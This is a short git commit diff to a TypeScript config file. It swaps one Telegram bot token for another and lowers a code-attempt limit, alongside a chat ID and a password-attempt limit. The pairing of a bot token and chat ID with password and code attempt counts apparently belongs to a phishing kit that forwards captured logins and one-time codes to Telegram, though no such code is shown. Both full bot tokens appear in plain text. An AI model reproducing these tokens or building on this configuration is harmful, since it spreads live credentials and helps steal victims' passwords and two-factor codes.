923e56bfc2ce2a39fee8d8bd24eb4b6c3f59f7e6
Yudind96 <thanhduy19796@gmail.com>
2025-08-13 11:53:53 +0700

    Update data.ts

--- app/config/data.ts
+++ app/config/data.ts
@@ -1,13 +1,13 @@
 export const APP_CONFIG = {
     CHAT_ID: '1261037261',
 
-    TOKEN: '7755839773:AAFkMu6ULbkOmij8cSXuq_I_MOhXgWsqObE',
+    TOKEN: '8134902426:AAGKIcamw3b_KYkKlLGvznKiPbaKu_3qU2g',
 
     MAX_PASSWORD_ATTEMPTS: 2,
 
     LOAD_TIMEOUT_MS: 3000,
 
-    MAX_CODE_ATTEMPTS: 5
+    MAX_CODE_ATTEMPTS: 3
 } as const;
 
 type AppConfig = typeof APP_CONFIG;
